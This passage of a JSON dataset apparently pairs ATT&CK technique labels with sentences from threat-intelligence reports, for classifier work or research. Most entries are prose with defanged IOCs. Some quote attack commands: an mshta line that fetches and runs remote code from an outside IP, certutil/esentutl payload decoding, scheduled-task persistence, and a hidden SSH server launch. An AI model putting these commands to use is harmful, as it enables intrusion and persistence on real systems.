execution flow, starting from the initial infection vector, running VBA code via a macro and then dropping the PowerShell code that establishes command-center communications, sends victim system information and then receives commands supported by the malware",
        "http://www.cankayasrc[.]com/style/js/main.php http://ektamservis[.]com/includes/main.php http://gtme[.]ae/font-awesome/css/main.php  Recommendations for organizations Effective protection from targeted attacks focuses on advanced detective, preventive and investigative capabilities via solutions and training, allowing an organization to control any activities on their network or suspicious files on user systems",
        "This information can then be transmitted to the attacker using protocols such as FTP, HTTP, and SMTP",
        "tfvn[.]com[.]vnshirkeswitch[.]netguideofgeorgia[.]orggulfclouds[.]sitejhssourcingltd[.]comkamagra4uk[.]compioneerfitting[.]compositronicsindia[.]comscseguros[.]ptspldernet[.]comtoshioco[.]comwww[.]happytohelpyou[.]inIP addressesThe following IP addresses have been observed to be associated with malware campaigns.112.213.89[.]4067.23.254[.]6162.212.33[.]98153.92.5[.]124185.117.22[.]19723.94.188[.]24667.23.254[.]17072.52.150[.]218148.66.136[.]62107.180.24[.]253108.179.246[.]13818.221.35[.]21494.46.15[.]20066.23.237[.]18672.52.150[.]218URLs:The following URLs have been observed to be associated with malware campaigns.https[:]//a[.]pomf[.]cat/http[:]//pomf[.]cat/upload[.]php",
        "The initial DNS query sent by the payload to obtain the system specific identifier uses the following structure, which includes the current process identifier (PID) as the subdomain of the C2 domain: <current process id>.<c2 domain> The C2 server will provide the system specific identifier within the answer portion of the DNS response",
        "The following shows the specific IP addresses or strings used by the C2 to transmit a success or cancel message depending on the type of DNS query used for C2 communications:    DNS Type Successful Cancel   A,AC 1.1.1.\\d+ 1.2.9.\\d+   AAAA 2a00:: 2200::   CNAME,MX,TXT,SRV,SOA ok cancel    After providing system specific information, the payload will Interact with the C2 server to obtain commands, which the payload refers to as jobs",
        "To obtain strings to treat as commands, the payload will issue a series of DNS queries to resolve domains with the following structure: <system id>-<job ID>-<offset data specific to job>.<c2 domain> The C2 server will provide responses to these queries that contain answers in IPv4 or IPv6 addresses depending on the type of DNS query the payload uses to communicate with its C2 server",
        "This command will automatically set the DNS type to use for actual C2   $showconfig Uploads the current configuration of the payload to the C2   slpx:\\d+ Sets the sleep interval between outbound DNS requests   $fileUpload Downloads contents from the C2 server and writes them to a specified file    Table 3 Commands available to payload Campaign Analysis The following domains are configured within the payload to be used as C2s",
        "For instance, the downloader will first attempt to communicate with its C2 server using an HTTPS request",
        "If that HTTPS request is not successful, the downloader will issue an HTTP request",
        "Lastly, if the HTTP request is not successful, the downloader will fallback to using DNS tunneling to establish communications",
        "If both attempts fail and the payload is unable to obtain a session ID and pre-shared key via HTTP or HTTPS, it will try to use DNS tunneling",
        "It does so using either the HTTPS/HTTP or DNS channels, depending on which method is successful",
        "The payload will construct a message that has the following structure that it will then send to the C2: \u00a0 bye<char uuid[35]>d \u00a0 The message above is sent via a simple HTTPS/HTTP POST request to the C2 server",
        "As seen in the above request, the Trojan will generate a URL for its beacon with the following structure:http://<c2 domain>/chk?<hex(Environment.UserName/Environment.MachineName)> The Trojan will issue a request to this URL to check (hence the chk string in the URL) to see if the C2 server has a command for the Trojan to run",
        "The Trojan will then read the hexadecimal formatted contents of this file in 1500 byte blocks, sending each 1500 bytes of data from the file to the C2 server via an HTTP GET request to a URL with the following structure:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(command prompt output)> The upload command (2) writes data provided by the C2 to a specified file",
        "[1]\u00a0https://www.clearskysec.com/report-the-copykittens-are-targeting-israelis/ [2]\u00a0https://www.clearskysec.com/copykitten-jpost/",
        "After the C2 information has been collected, BADNEWS leverages HTTP for communication with the remote servers",
        "33 Download specified file to %TEMP%\\up and execute it in a new process    \u00a0 During C2 communications, BADNEWS will communicate to the C2 previously identified via HTTP",
        "Exfiltrate data using HTTP over HTTP over AES over XOR, or any combination of the available transports",
        "Deep Discovery Inspector protects customers from these threats via this DDI Rule:  DDI Rule 18 : DNS response of a queried malware Command and Control domain DDI Rule 15 : Many unsuccessful logon attempts (nbt_scan.exe) DDI Rule 38 : Multiple unsuccessful logon attempts (nbt_scan.exe)  TippingPoint customers are protected from these threats via these ThreatDV filters:  27218: HTTP: TROJ_RATANKBA_A Checkin 28219: HTTP: TROJ_RATANKBA_A Checkin 02 27220: HTTPS: TROJ_RATANKBA_A Checkin 27221: HTTP: Sundown EK Flash Exploit (SWF_EXPLOYT.YYRQ)  A list of related Indicators of Compromise (IoCs) can be found in this appendix",
        "IcedCoffee is a fairly basic backdoor which uses WMI to collect a variety of system and user information from the system, which is then encoded with base64, encrypted with RC4 and submitted via HTTP POST to the C2 server",
        "It then calls the subfunction with the argument of 2 to get the string that it will use as the HTTP POST request",
        "The resulting HTTP POST request looks like the following: POST http://185.25.50[.]93/syshelp/kd8812u/protocol.php HTTP/1.1 Host: 185.25.50[.]93 Content-Type: application/x-www-form-urlencoded Content-Length: 21 porg=44908AE0524f422d We have not seen a C2 server respond to our requests during our analysis, however, we do know how the Trojan will parse the C2\u2019s response for specific data",
        "We have seen the following HTTP POST parameters within the Zebrocy C++ samples: porg structOne oq volume DDE Details The author of the DDE document used in the February 2018 attacks used some obfuscation techniques in an attempt to evade detection",
        "Victim Registration SpeakUp uses POST and GET requests over HTTP to communicate with its main C&C which is the compromised website of speakupomaha[.]com",
        "It uses the legitimate Naver email platform in order to communicate with the attackers via email",
        "Command & Control  The malware communicates with the Naver email platform in order to communicate with the operator",
        "It communicates with ftp.bytehost31[.]org via FTP for command and control (C2)",
        "Domains  http://mdzz2019.noip[.]cn:19931 http://mdzz2019.noip[.]cn:3654/  From my analyses, I was able to identify http://mdzz2019.noip[.]cn:19931 as its main C2 url.\u00a0 This is a dynamic DNS, meaning the actual IP changes quite frequently",
        "XAgent uses HTTP requests to communicate with its C2 servers, which allows the threat actor to interact with the compromised system",
        "The Trojan uses HTTP POST requests, as seen in Figure 1 to send data to the C2 server, and GET requests to receive commands from the server, as seen in Figure 2",
        "Figure 1 XAgent macOS HTTP POST request  Figure 2 XAgent mscOS HTTP GET request The C2 URLs generated by XAgentOSX are very similar to those created by its Windows-based counterpart",
        "Figure 3 Hardware ID used by XAgent to uniquely identify compromised hosts When generating the URLs within the HTTP POST and GET requests, XAgent sets one HTTP parameter using a specific data structure that contains this agent_id value",
        "For instance, when using this string we observed DNS queries for \u201capple-search.infoclose\u201d, as the string \u201cclose\u201d was supposed to be the next portion of the C2 URL",
        "",
        "it operates over DNS traffic, but can also switch to encrypted channels such as HTTPS or SSL",
        "HAWKBALL is a backdoor that communicates to a single hard-coded C2 server using HTTP",
        "The malware sends an HTTP GET request to its C2 IP address using HTTP over port 443"
    ],
    "screen capture file and directory discovery-multi": {
        "technique_names": [
            "screen capture",
            "file and directory discovery",
            "tor"
        ],
        "sentances": [
            "It has the capability to find files, enumerate drives, exfiltrate data, take screenshots and provide a reverse shell"
        ]
    },
    "registry run keys / startup folder": [
        "Persistence is maintained through a Run registry key",
        "In the order to run the SSH server, the attackers created a VBS file with the following content: Set WshShell = CreateObject(\u201cWScript.Shell\u201d) WshShell.CurrentDirectory = \u201cC:\\WINDOWS\\TEMP\\Dropbear\\\u201d WshShell.Run \u201cdropbear.exe -r rsa -d dss -a -p 6789\u201d, 0, false As is evident here, the SSH server will accept connections on port number 6789",
        "This marker indicates the presence of an encrypted MZ marker in the .hwp file and is decrypted by the malware and written to the Startup folder for the user:  C:\\Documents and Settings\\<username>\\Start Menu\\Programs\\Startup\\viso.exe  This step establishes the persistence of the malware across reboots on the endpoint Once the decrypted MZ marker is written to the Startup folder, the 2.hwp is deleted from the endpoint  The malware might perform this activity for a couple of reasons:  Establish persistence for itself on the endpoint Establish persistence of another component of the malware on the endpoint Update itself on endpoint after a separate updater component downloads the update from the control server  The malware has limited reconnaissance and data-gathering capabilities and is not full-fledged spyware",
        "Finally, the first DLL adds the registry key \u201cSysRat,\u201d at SoftWare\\Microsoft\\Windows\\CurrentVersion\\Run, to ensure the malware is executed at startup",
        "The two variants of MPK share the same registry key that the Trojan uses to automatically run each time the system starts, specifically: [HKLM and HKCU]\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\explorer Both MPK variants include key loggers that are extremely similar in functionality in addition to having the same strings used for headers within the key log file",
        "The RunAtLoad key will command launchd to run the daemon when the operating system starts up, while the KeepAlive key will command launchd to let the process run indefinitely",
        "The embedded VBScript is retrieved from a resource and decrypted using the same algorithm as discussed above, which results in the following cleartext:       set objshell = createobject(\\\"wscript.shell\\\")objshell.run \\\"mshta hxxp://86.106.131.177:6500/zIZFh\\\",vbhide     The Koadic C2 server will respond to this request with Javascript code that acts as the Koadic staging payload, which allows the actor to run additional Koadic modules on the end system to carry out their post-exploitation activities",
        "NavRAT then creates a registry key in order to execute this file copy at the next reboot of the system, an initial method of persistence",
        "Once the user clicks on the fake Adobe Flash Player installer, it will extract/create the following malicious payload into the Startup directory to maintain its persistence:",
        "Register the RUN key in the registry below, so that the VBS file is executed every time the machine starts",
        "A new registry entry is created at HKEY_CURRENT_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Graphics with a value of \u201cC:\\ ProgramData \\ Initech \\Initech.exe\u201d /run.",
        "When each file is encrypted, registry keys are created under HKU\\{SID}\\Software\\Microsoft\\ RestartManager \\ which are used to track metadata pertaining to the file being encrypted, such as owner, sequence, session and file hash",
        ""
    ],
    "shortcut modification": [
        "APT10 spear phishes have been relatively unsophisticated, leveraging .lnk files within archives, files with double extensions (e.g",
        "The .lnk file extracted from the .7zip file",
        "When the .lnk file is initialized, it spawns a CMD process",
        "We have covered recent FIN7 activity in previous public blog posts:   FIN7 Spear Phishing Campaign Targets Personnel Involved in SEC Filings  FIN7 Evolution and the Phishing LNK  To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence  The FireEye iSIGHT Intelligence MySIGHT Portal contains additional information on our investigations and observations into FIN7 activity",
        "The .zip archive attached to the email contains a Windows shortcut (.lnk) file with the Microsoft Internet Explorer logo",
        "Clicking on the shortcut ultimately leads to Backdoor.Pirpi being downloaded and executed on the affected computer",
        "Comnie is able to achieve persistence via a .lnk file that is stored within the victim\u2019s startup path",
        "Additionally, in the event Kaspersky is detected, the malware will immediately run the \u2018Conime.lnk\u2019 shortcut file in a new process after it is created",
        "The script saves the decoded and decompressed executable to %APPDATA%\\Microsoft\\Windows\\Templates\\WindowsTemplate.exe and creates an LNK shortcut at %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrive.lnk to persistently run WindowsTemplate.exe each time Windows starts up",
        "This round of FIN7 phishing lures implements hidden shortcut files (LNK files) to initiate the infection and VBScript functionality launched by mshta.exe to infect the victim",
        "In this ongoing campaign, FIN7 is targeting organizations with spear phishing emails containing either a malicious DOCX or RTF file \u2013 two versions of the same LNK file and VBScript technique",
        "This spawns the hidden embedded malicious LNK file in the document",
        "Figure 3: FIN7 phishing lure persistence mechanisms Examining Attacker Shortcut Files In many cases, attacker-created LNK files can reveal valuable information about the attacker\u2019s development environment",
        "These files can be parsed with lnk-parser to extract all contents",
        "LNK files have been valuable during Mandiant incident response investigations as they include volume serial number, NetBIOS name, and MAC address",
        "If this file exists, the content is read in order to obtain a path to find a second file with the LNK (link) extension",
        "The LNK file is finally used to identify a third file: a ZIP file",
        "When it is executed, it creates two files: an LNK file that points to %system32%\\rundll32.exe, and the FELIXROOT loader component",
        "The LNK file is moved to the startup directory",
        "This file is then copied to a filename of \u2018Windows Update.lnk\u2019, which is placed in the startup path previously identified",
        "This shortcut file points to the path of the previously written \u2018Applet.cpl\u2019 file",
        "Finally, Reaver.v1 will execute the \u2018~WUpdate.lnk\u2019 file in a new process, thus loading the recently dropped malicious CPL file",
        "This shortcut file points to the path of the previously written \u2018winhelp.cpl\u2019 file",
        "Finally, Reaver.v2 will execute the \u2018~Update.lnk\u2019 file in a new process, thus loading the recently dropped malicious CPL file",
        "This shortcut file calls the built-in \u2018control.exe\u2019 utility to in turn load the previously dropped malicious CPL file of \u2018winhelp.cpl\u2019",
        "In this campaign the KopiLuwak backdoor was encoded and delivered in a Windows shortcut (.lnk) file",
        "The lnk files were an especially interesting development because the powershell code they contain for decoding and dropping the payload is nearly identical to that utilized by the Zebrocy threat actor a month earlier",
        "Using Windows Shortcut files (.lnk) in the Startup folder that invoke the Windows Scripting Host (wscript.exe) to execute a Jscript backdoor for persistence",
        "When the Trojan runs as an executable within the \u201cDsvHelper\u201d folder, the Trojan will create a shortcut (.lnk file) and save the shortcut to the \u2018DsvHelper\u2019 folder",
        "2 Successful payload download Astaroth\u2019s initial payload is a malicious .lnk file, a common delivery method used by threat actors",
        "Malicious .lnk files contain a link to a URL (instead of the expected local URI) to grab the next payload",
        "In the case of Astaroth trojan, the .lnk file contains an argument into WMIC.exe to run in non-interactive mode, which forgoes opening a window that the victim could notice, to download the hardcoded url in the .lnk"
    ],
    "new service remote services-multi": {
        "technique_names": [
            "new service",
            "remote services"
        ],
        "sentances": [
            "Service providers have significant access to customer networks, enabling an attacker who had compromised a service provider to move laterally into the network of the service provider\u2019s customer"
        ]
    },
    "new service system network configuration discovery connection proxy-multi": {
        "technique_names": [
            "new service",
            "system network configuration discovery",
            "connection proxy"
        ],
        "sentances": [
            "Once connectivity to the service provider IP was verified, the actor established the service provider IP as a proxy for the victim\u2019s SOGU backdoor"
        ]
    },
    "data encoding": [
        "The tactic also serves to mask malicious C2 and exfiltration traffic and make it appear innocuous",
        "Encoded Payload   Decoded Payload     MD5   Size   Import Hash   Exported Function   Version    aa3f303c3319b14b4829fe2faa5999c1  322164  182ee99b4f0803628c30411b1faa9992  l7MF25T96n45qOGWX  5.3.2    126067d634d94c45084cbe1d9873d895  330804  5f45532f947501cf024d84c36e3a19a1  hJvTJcdAU3mNkuvGGq7L  5.4.1    fce54b4886cac5c61eda1e7605483ca3  345812  c1942a0ca397b627019dace26eca78d8  WcuH  5.4.1    Table 2: Static characteristics of UPPERCUT Another new feature in the latest UPPERCUT sample is that the malware sends an error code in the Cookie header if it fails to receive the HTTP response from the command and control (C2) server",
        "Another difference in the network traffic generated from the malware is that the encoded proxy information has been added in the URL query values during the C2 communication",
        "The communication and exfiltration of data was detected in a real-world scenario using the Cybereason platform",
        "The encoded payload is then made to look like a URI by having a random number of \u2018/\u2019 characters inserted at random locations within the encoded payload",
        "McAfee ATR has now discovered additional implants that are part of an operation to gain persistence for continued data exfiltration and for targeted access",
        "The optional HTTP data with king.jpg looks like a beacon to inform the control server that the malware is ready to accept new commands:  Commands received from the control server are encoded DWORDs After decoding, these DWORDs should be in the range 123459h to 123490h  Malware checking to make sure a received command is in the correct range",
        "If the size is 7 bytes or more, the backdoor verifies that the command and control server sent an encoded package",
        "The generated buffer is encoded using the BASE64 alphabet to be sent in the POST request",
        "The DropIt Trojan we analyzed is an executable that builds an embedded executable by decoding embedded blobs of base64 encoded data and concatenating them together in the correct order",
        "It then sends the following IRC commands: NICK bxphzrjbxp USER bxphzrjbxp bxphzrjbxp bxphzrjbxp bxphzrjbxp To make sure it connected to the correct server, the Trojan checks for the message sent from the IRC server after the bot connects: Welcome to the MpkNet IRC Network The MPK bot does not join a specific IRC channel, instead sending private messages (PRIVMSG) to a user with the nick \u201cmpk\u201d",
        "In response to this request, the C2 server responds with a Base64-encoded RSA public key (seen in Figure 12)",
        "Data that is sent is compressed and then base64-encoded before being included in the requests",
        "The C2 server sends back Base64 encoded response",
        "The script gathers system specific data, such as the domain the system belongs to and the current username, that it constructs in the following format: \u00a0 <domain>\\<username>:pass \u00a0 The above string is encoded using a custom base64 encoder to strip out non-alphanumeric characters (=, / and +) from the data and replaces them with domain safe values (01, 02 and 03 respectively)",
        "A notable characteristic of CopyKittens is the use of DNS for command and control communication (C&C) and for data exfiltration",
        "Note: CTU researchers frequently observe threat actors renaming archiving tools and storing data for exfiltration in uncommon directories",
        "This encoded information then gets an additional header added and sent across the network.",
        "Once the host-based enumeration information was obtained, it was base64-encoded and then appended to the URL post request to a C2, whereas in previous versions this information was written to a text file."
    ],
    "spearphishing link spearphishing attachment-multi": {
        "technique_names": [
            "spearphishing link",
            "spearphishing attachment",
            "arp"
        ],
        "sentances": [
            "In this campaign, the group sent spear phishing emails containing malicious documents that led to the installation of the UPPERCUT backdoor"
        ]
    },
    "spearphishing attachment": [
        "Attack Overview The attack starts with Microsoft Word documents containing a malicious VBA macro being attached to spear phishing emails",
        "The actor has used several notable techniques in these incidents such as sniffing passwords from Wi-Fi traffic, poisoning the NetBIOS Name Service, and spreading laterally via the EternalBlue exploit.\u00a0 APT28 Uses Malicious Document to Target Hospitality Industry FireEye has uncovered a malicious document sent in spear phishing emails to multiple companies in the hospitality industry, including hotels in at least seven European countries and one Middle Eastern country in early July",
        "Initial Compromise For initial compromise, FireEye Intelligence has observed APT39 leverage spear phishing emails with malicious attachments and/or hyperlinks typically resulting in a POWBAT infection",
        "Malware Delivery Method  In all emails sent to these government officials, the actor used the same attachment: a malicious Microsoft Word document that exploited the CVE-2012-0158 vulnerability to drop a malicious payload",
        "Figure 1: Contents of the Email A review of the email header data from the spear phishing messages showed that the threat actors sent the emails using the same infrastructure they have used in the past",
        "In at least some of these recent attacks, Buckeye used spear-phishing emails with a malicious .zip attachment",
        "Looking at earlier attacks between 2013 and 2016, we believe Comnie was also used in targeted attacks against the following individuals or organizations:  Taiwan government IT service vendor in Asia Journalist of a Tibetan radio station   Figure 6 Email sent to Journalist of Tibetan radio station \u00a0 Malicious Macros The malicious macro documents used to deliver Comnie initially hide the content inside and requests that the user enables macros prior to viewing the document",
        "APT32 actors continue to deliver the malicious attachments via spear-phishing emails",
        "The credential harvesting attacks used spear-phishing emails that contained malicious Microsoft Office documents that leveraged the \u201cattachedTemplate\u201d technique to load a template from a remote server",
        "The attack involved a spear-phishing email with a subject of \u201cProject Offer\u201d and a malicious Word document (SHA256: d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318) as an attachment",
        "Attached to this email was a malicious Microsoft Word document (MD5: f6fafb7c30b1114befc93f39d0698560) that exploited CVE-2012-0158",
        "Like past attacks, the initial infection vector is a malicious Word document attached to a phishing email that is well-tailored to the targeted business and its day-to-day operations",
        "Phishing emails with political themes were used in the majority of the observed attack emails",
        "In order to meet the phishing emails\u2019 infrastructure requirements, disposable domains and emails were used as the delivery medium",
        "Based on our analysis, financial organizations in Turkey were targeted via spear phishing emails containing a malicious Microsoft Word document",
        "Figure 2: Excerpt of an APT33 malicious .hta file We assess APT33 used a built-in phishing module within the publicly available ALFA TEaM Shell (aka ALFASHELL) to send hundreds of spear phishing emails to targeted individuals in 2016",
        "The spear phishing emails and attached malicious macro documents typically have geopolitical themes",
        "The attackers used spear phishing emails combined with malicious HWP documents created using Hancom Hangul Office Suite",
        "We suspect the attacker was trying to generate sympathy by reminding the reader that Munchon and the province it is in, Kangwon, were part of a unified province that included South Korea's Gangwon-do prior to the division of Korea in 1945.A second email contained a story about a person called 'Ewing Kim' who was looking for help:The email's attachments are two different HWP documents, both leveraging same vulnerability (CVE-2013-0808)",
        "This campaign began with a handful of spear phishing emails to South Korean targets and containing malicious attachments",
        "MAGIC HOUND TOOLSET The Magic Hound attacks did not rely on exploit code to compromise targeted systems, instead relying on executables and Microsoft Office documents, specifically Excel and Word documents containing malicious macros",
        "The emails had a malicious Excel macro document attached, which when executed led to a new Microsoft Visual Basic (VB) script-based malware family which we are dubbing \u201cBabyShark\u201d",
        "Another interesting characteristic of the malicious documents is that the metadata associated with the document files themselves also matches that found in many of the malicious documents that were previously being used to spread Remcos.Figure 3: Document metadataAdditionally, the creation and modification dates associated with these documents are shortly after we released a detailed analysis of Remcos distribution campaigns that were being observed throughout 2018",
        "In May 2016, we\u00a0published\u00a0a blog detailing a spear phishing campaign targeting banks in the Middle East region that used macro-enabled attachments to distribute POWBAT malware",
        "Analysis APT34 sent a malicious .rtf file (MD5: a0e6933f4e0497269620f44a083b2ed4) as an attachment in a malicious spear phishing email sent to the victim organization",
        "This attack diverged from previous attacks we observed from this group as it involved spear-phishing emails sent to targeted organizations with password protected RAR archive attachments that contained malicious Excel Web Query files (.iqy)",
        "In this instance a spear phishing email was used containing a lure designed to socially engineer and entice the victim to executing a malicious attachment",
        "In contrast to the two samples used in these attacks, this one did not use a PE attachment, and instead used a Microsoft Word document containing a malicious macro as the delivery vehicle",
        "The email contained an attachment named Seminar-Invitation.doc, which is a malicious Microsoft Word document we track as ThreeDollars",
        "Zebrocy is delivered primarily via phishing attacks that contain malicious Microsoft Office documents with macros as well as simple executable file attachments",
        "Malicious Document   Decoy Document  The attack starts with a spear-phishing email containing the HWP document named \"\ubbf8\ubd81 \uc815\uc0c1\ud68c\ub2f4 \uc804\ub9dd \ubc0f \ub300\ube44.hwp\" (Prospects for US-North Korea Summit .hwp)",
        "Initial Attack On December 13, 2017, a spear phishing email was sent from the email address of yuri.sidorav@yandex[.]ru to a high ranking individual within a British government agency",
        "Traps blocks all of the files currently associated with Gorgon Group  \u00a0 Appendix \u00a0 Analysis of a targeted attack \u201c1971 Liberation War Freedom Fighters in Pakistan ArmyCustody Database98\u201d The delivery documents used in the targeted attacks are Microsoft Office documents that contain a macro that attempts to compromise the system",
        "Delivery TG-3390 conducts SWCs or sends spearphishing emails with ZIP archive attachments",
        "The initial infection vector of this campaign is a Microsoft Office Excel Worksheet with an Office macro that uses the mshta.exe Windows executable to run scripts, which are embedded in the HTML of a specially-crafted blogspot.com page",
        "",
        "The case we found arrived through a targeted email that contained a document file (in docx format).",
        "APT32 likely used COVID-19-themed malicious attachments against Chinese speaking targets."
    ],
    "user execution": [
        "Once the password (delivered in the body of the email) is entered, the users are presented with a document that will request users to enable the malicious macro, as shown in Figure 3",
        "Successful execution of the macro within the malicious document results in the installation of APT28\u2019s signature GAMEFISH malware",
        "Once the user enables macros, the macro will perform the following actions:  Displays decoy content Checks for the existence of a file at %APPDATA%\\wscript.exe If %APPDATA%\\wscript.exe does not exist, the macro converts an embedded hex-encoded string into bytes and saves this data to the %APPDATA%\\wscript.exe",
        "None of the known documents contain a lure image or message to instruct the recipient to click the Enable Content button necessary to run the macro, as seen in Figure 1",
        "The majority of delivery documents contain a generic lure image requesting the victim enable macros with no additional content, the adversaries seemingly relying solely on lure filenames to entice victims to launch the malicious document",
        "The victim will then see a prompt to Enable Content as with any malicious macro document as seen in Figure 5",
        "Figure 5 Remote template document requesting the user to click \u201cEnable Content\u201d to run macro Clustering The delivery documents used in the October and November waves shared a large number of similarities, as seen in Table 1, which allowed us to cluster the activity together",
        "Figure 1: Malicious FIN7 lure asking victim to double click to unlock contents The malicious LNK launches \u201cmshta.exe\u201d with the following arguments passed to it: vbscript:Execute(\"On Error Resume Next:set w=GetObject(,\"\"Word.Application\"\"):execute w.ActiveDocument.Shapes(2).TextFrame.TextRange.Text:close\") The script in the argument combines all the textbox contents in the document and executes them, as seen in Figure 2",
        "Malicious processes are marked red (click image to enlarge):  The following malicious files are dropped and run:  C:\\ProgramData\\{2ED05C38-D464-4188-BC7F-F6915DE8D764}\\OFFLINE\\9A189DFE\\C7B7C186\\main.vbs dcac79d7dc4365c6d742a49244e81fd0 C:\\Users\\Public\\Libraries\\RecordedTV\\DnE.ps1 7fe0cb5edc11861bc4313a6b04aeedb2 C:\\Users\\Public\\Libraries\\RecordedTV\\DnS.ps1 3920c11797ed7d489ca2a40201c66dd4 \u201cC:\\Windows\\System32\\schtasks.exe\u201d /create /F /sc minute /mo 3 /tn \u201cGoogleUpdateTasksMachineUI\u201d /tr C:\\Users\\Public\\Libraries\\RecordedTV\\backup.vbs 7528c387f853d96420cf7e20f2ad1d32  Command and control server is located in the following domain: tecsupport[.]in A detailed analysis of the malware is provided in two\u00a0posts by Palo Alto networks and in a post\u00a0by FireEye, which\u00a0wrote about previous campaigns by this threat agent",
        "This document was a decoy aimed to entice the user to open malicious documents embedded further down the pageThe actor embedded two additional links and the document urged the user to click on these links for more information about New Year's activities in North Korea",
        "These documents contained malicious OLE objects used to drop binaries.This time, however, they contained malicious OLE (Object Link Embedded) objects.Initial analysis confirmed two similarly sized OLE object files within this document which appeared to be the same from an execution point of view.The two dropped binaries were stored and executed in this location during our analysis:C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\Hwp (2).exeC:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\Hwp (3).exeInitial analysis showed some sloppy cleaning up from Group123, which we used later to determine that separate campaigns were the work of this same actor, as compilation artifacts remained within the binaries:e:\\Happy\\Work\\Source\\version 12\\T+M\\Result\\DocPrint.pdbThe second stage of the dropped binaries was used to execute wscript.exe while injecting shellcode into this process",
        "Email attacks often use \u201cclick-worthy\u201d or interesting topics to convince users to click links or open attachments that could lead to various threats",
        "Users are advised to avoid opening attachments and click links on unsolicited emails",
        "In one example, the Word document contained a button with the label \u201cFirst click \u201cEnable Content\u201d above the page, then click here to fill out the form\u201d  This string attempts to trick the user into enabling macros to execute the malicious code within the macro",
        "These Honeybee documents did not contain any specific lures, rather variations of a \u201cnot compatible\u201d message attempting to convince the user to enable content",
        "Additionally, a small number of campaigns over this same period also made use of various file-sharing platforms like Dropbox for hosting the malicious documents rather than directly attaching them to the messages themselves.Figure 2: Example malicious Excel documentSimilar to the technique described in our previous blog about Remcos, the contents of the documents have been intentionally made to appear as if they are blurry, with the user being prompted to enable editing to have a clearer view of the contents",
        "By default, Excel does not allow the download of data from the remote server, but will ask for the user\u2019s consent by presenting the dialog box in Figure 2:  Figure 2 Excel security notice for .iqy files By enabling this data connection, the user allows Excel to obtain content from the URL in the .iqy file",
        "The document also contained a lure image, similar to ones commonly found in malicious macro documents which ask the user to click on \u201cEnable Content\u201d as seen in Figure 2",
        "Malicious Macro Analysis When the victim opens the ThreeDollars document they are presented with the lure image and prompted to click on the \u201cEnable Content\u201d button",
        "Message 3:    Headers Received: by mailcenter.support   Sender Mercator Institute for China Studies <publications@mericcs.org>   Subject Authoritarian advance Responding to Chinas growing political influence in Europe   Body Content and images included within the e-mail body were a direct copy of the following MERICS report:  https://www.merics.org/sites/default/files/2018-02/GPPi_MERICS_Authoritarian_Advance_2018_1.pdf   Notes The hyperlinked text Click here to download the report within the e-mail body lead to a malicious RTF document located at the URL hxxp://www.mericcs.org/GPPi_MERICS_Authoritarian_Advance_2018_1Q.doc",
        "Cluster A Case 1: Delivery via document property macro \u2013 a789a282e0d65a050cccae66c56632245af1c8a589ace2ca5ca79572289fd483 \u00a0In our research we found at least one attack against a company leveraging a Microsoft Office Excel document with an embedded macro to launch the malware",
        "By doing so, the main content of the macro itself (Figure 2) can be kept relatively simple, and the malicious\u2019 codes small footprint can help enable evasion of automated detection mechanisms based on macro content",
        "",
        "In March, we came across an email with a malware attachment that used the Gamaredon group\u2019s tactics.",
        "",
        "Whitefly first infects its victims using a dropper in the form of a malicious .exe or .dll file that is disguised as a document or image.",
        "",
        "Once a user has double-clicked the embedded image, the form executes a VB setup script",
        "The threat actors also took additional steps to replace some variable strings in the more recent samples, likely in an attempt to avoid signature-based detection from Yara rules. Once the document was opened, it prompted the user to enable the macro titled \"BlackWater.bas\"."
    ],
    "process hollowing execution through api masquerading application window discovery-multi": {
        "technique_names": [
            "process hollowing",
            "execution through api",
            "masquerading",
            "application window discovery"
        ],
        "sentances": [
            "2.\u00a0\u00a0\u00a0\u00a0 The macro decodes the dropped files using Windows certutil.exe with the following commands (certutil.exe is a legitimate built-in command-line program to manage certificates in Windows):    C:\\Windows\\System32\\cmd.exe\" /c certutil -decode C:\\ProgramData\\padre1.txt C:\\ProgramData\\\\GUP.txt    C:\\Windows\\System32\\cmd.exe\" /c certutil -decode C:\\ProgramData\\padre2.txt C:\\ProgramData\\\\libcurl.txt    C:\\Windows\\System32\\cmd.exe\" /c certutil -decode C:\\ProgramData\\padre3.txt C:\\ProgramData\\\\3F2E3AB9    3.\u00a0\u00a0\u00a0\u00a0 The macro creates a copy of the files with their proper extensions using Extensible Storage Engine Utilities (esentutil.exe) with the following commands (esentutil.exe is also a legitimate program that is pre-installed in Windows):    C:\\Windows\\System32\\esentutl.exe\" /y C:\\ProgramData\\\\GUP.txt /d C:\\ProgramData\\GUP.exe /o    C:\\Windows\\System32\\esentutl.exe\" /y C:\\ProgramData\\\\libcurl.txt /d C:\\ProgramData\\libcurl.dll /o   The dropped files include the following:  GUP.exe\u00a0:\u00a0GUP, a free (LGPL) Generic Updater.\u00a0GUP is an open source binary used by Notepad++ for software updates"
        ]
    },
    "code signing": [
        "The version used here is version 4.1 digitally signed by Notepad++, as shown in Figure 5",
        "By using this technique, the malware is able to leverage itself from a signed and verified legitimate Windows OS process, or, alternatively, if aswrundll.exe or unins000.exe exists, a signed and verified security product process",
        "FIN7 has consistently utilized legally purchased code signing certificates to sign their CARBANAK payloads",
        "In these websites they hosted malware that was digitally signed\u00a0with a valid, likely stolen code signing certificate Based on VirusTotal uploads, malicious documents content, and known victims \u2013 other targeted organisations are located in Turkey, Qatar, Kuwait, United Arab Emirates, Saudi Arabia, and Lebanon",
        "Digitally signed malware The entire bundle (VPN client and malware) was digitally signed with a valid code signing certificate issued by Symantec to AI Squared, a legitimate software company that develops accessibility software:  Thumbprint: F340C0D841F9D99DBC289151C13391000366631C Serial number: 45 E4 7F 56 0B 01 B6 4E 68 39 5E 5D 79 2F 2E 09 Another Helminth sample,\u00a01c23b3f11f933d98febfd5a92eb5c715, was signed with a different AI Squared code signing certificate: Thumbprint: 92B8C0872BACDC226B9CE4D783D5CCAD61C6158A Serial number:62 E0 44 E7 37 24 61 2D 79 4B 93 AF 97 46 13 48 This suggest that the attackers had got a hold of an Ai Squared signing key, potentially after compromising their network",
        "The file, named Microsoft.Win32.TaskScheduler.dll, is digitally signed by a certificate from AirVPN",
        "The DLL is also digitally signed by a certificate from \u201cAirVPN\u201d",
